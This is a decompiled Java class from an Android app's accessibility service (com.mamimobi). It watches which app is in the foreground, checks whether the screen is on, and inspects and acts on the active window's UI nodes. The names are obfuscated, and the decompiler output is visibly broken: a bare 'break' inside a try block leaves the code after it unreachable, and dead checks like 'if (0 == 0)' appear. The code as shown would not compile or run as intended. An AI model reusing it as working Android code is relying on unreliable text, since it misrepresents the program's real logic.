package defpackage;

import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.mamimobi.AccessService;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class o1 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ AccessService F;
    public final /* synthetic */ String G;

    public /* synthetic */ o1(AccessService accessService, String str, int i) {
        this.E = i;
        this.F = accessService;
        this.G = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int type;
        int i = 1;
        int i2 = 2;
        AccessibilityNodeInfo root = null;
        switch (this.E) {
            case 0:
                String str = AccessService.V;
                AccessService accessService = this.F;
                accessService.getClass();
                new Handler(Looper.getMainLooper()).postDelayed(new o1(accessService, this.G, i2), 100L);
                return;
            case 1:
                AccessService accessService2 = this.F;
                String str2 = this.G;
                String str3 = AccessService.V;
                accessService2.getClass();
                a8 a8VarE = a8.e();
                if (a8VarE.g) {
                    try {
                        break;
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    if (((PowerManager) accessService2.getSystemService("power")).isInteractive()) {
                        if (!AccessService.m0.get()) {
                            if (!str2.equals(accessService2.getPackageName()) && !p9.b(str2) && AccessService.Q0.contains(str2)) {
                                AccessService.U0 = str2;
                            }
                        }
                        if (a8VarE.g && str2 != null) {
                            a8VarE.c();
                            a8VarE.e.execute(new p7(a8VarE, i, str2));
                        }
                        accessService2.J = str2;
                        return;
                    }
                    a8 a8VarE2 = a8.e();
                    if (a8VarE2.g) {
                        a8VarE2.c();
                        a8VarE2.e.execute(new e(4, a8VarE2));
                    }
                    accessService2.J = null;
                    return;
                }
                return;
            default:
                String str4 = this.G;
                String str5 = AccessService.V;
                AccessService accessService3 = this.F;
                accessService3.getClass();
                AtomicBoolean atomicBoolean = AccessService.o0;
                try {
                    try {
                        List<AccessibilityWindowInfo> windows = accessService3.getWindows();
                        if (!windows.isEmpty()) {
                            Iterator<AccessibilityWindowInfo> it = windows.iterator();
                            while (true) {
                                if (it.hasNext()) {
                                    AccessibilityWindowInfo next = it.next();
                                    if (next != null && next.isActive() && (type = next.getType()) != 4 && type != 2 && type != 5) {
                                        root = next.getRoot();
                                    }
                                }
                            }
                        }
                        if (root == null) {
                            atomicBoolean.set(false);
                            if (root == null) {
                                return;
                            }
                        } else {
                            CharSequence packageName = root.getPackageName();
                            if (packageName != null && str4.equals(packageName.toString())) {
                                if (AccessService.w(root)) {
                                    AccessService.E(root);
                                } else if (AccessService.x(root)) {
                                    AccessService.q(root);
                                } else if (AccessService.z(root)) {
                                    AccessService.k0.set(true);
                                    AccessService.f0 = "";
                                    AccessService.C0.set(2);
                                    AccessService.H();
                                }
                            }
                            atomicBoolean.set(false);
                        }
                    } catch (Exception e2) {
                        e2.printStackTrace();
                        atomicBoolean.set(false);
                        if (0 == 0) {
                            return;
                        }
                    }
                    root.recycle();
                    return;
                } catch (Throwable th) {
                    atomicBoolean.set(false);
                    if (0 != 0) {
                        root.recycle();
                    }
                    throw th;
                }
        }
    }
}
